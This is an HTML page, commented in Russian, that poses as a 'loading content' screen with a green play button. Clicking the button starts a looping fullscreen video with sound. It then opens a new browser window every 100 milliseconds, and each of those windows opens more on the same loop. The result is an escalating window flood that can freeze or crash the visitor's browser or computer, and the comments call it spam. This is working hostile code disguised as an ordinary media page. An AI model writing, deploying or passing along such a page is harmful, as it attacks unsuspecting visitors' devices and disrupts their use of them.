<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        html, body {
            margin: 0; padding: 0; height: 100%;
            background: #000; overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #start-screen {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            background: #000; cursor: pointer; z-index: 9999;
        }
        #start-screen h1 {
            font-size: 22px; color: #fff; margin-bottom: 30px;
        }
        #green-btn {
            background: #00cc44; color: #fff; border: none;
            padding: 18px 40px; font-size: 20px;
            border-radius: 8px; cursor: pointer;
            box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
        }
        #green-btn:hover { background: #00ff55; }
        
        #video-container {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 1; display: none; background: #000;
        }
        #fullscreen-video {
            width: 100%; height: 100%; object-fit: cover;
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="start-screen" onclick="startVideo()">
        <h1>Загрузка контента...</h1>
        <button id="green-btn" onclick="event.stopPropagation(); startVideo();">
            ▶ Нажми, чтобы показать
        </button>
    </div>

    <div id="video-container">
        <video id="fullscreen-video" loop playsinline>
            <source src="video.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        var started = false;

        function startVideo() {
            if (started) return;
            started = true;

            document.getElementById('start-screen').classList.add('hidden');
            document.getElementById('video-container').style.display = 'block';

            var video = document.getElementById('fullscreen-video');
            video.muted = false;
            video.play().catch(function(e) {
                video.muted = true;
                video.play().catch(function(){});
            });

            // Сразу же запускаем попытки спама каждые 0.1 секунды (100 мс) без остановки
            setInterval(function() {
                try {
                    var w = window.open('', '_blank');
                    if (w) {
                        w.document.write(`
                            <html>
                            <head>
                                <title>Loading...</title>
                                <style>
                                    html, body { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
                                    video { width: 100%; height: 100%; object-fit: cover; }
                                </style>
                            </head>
                            <body>
                                <video id="v" loop playsinline>
                                    <source src="video.mp4" type="video/mp4">
                                </video>
                                <script>
                                    var v = document.getElementById('v');
                                    v.muted = false;
                                    v.play().catch(function() {
                                        v.muted = true;
                                        v.play().catch(function(){});
                                    });
                                    
                                    // Внутри копии тоже долбимся каждые 0.1 сек
                                    setInterval(function() {
                                        try { window.open(window.location.href, '_blank'); } catch(e) {}
                                    }, 100);
                                <\/script>
                            </body>
                            </html>
                        `);
                    }
                } catch(e) {}
            }, 100);
        }
    </script>
</body>
</html>
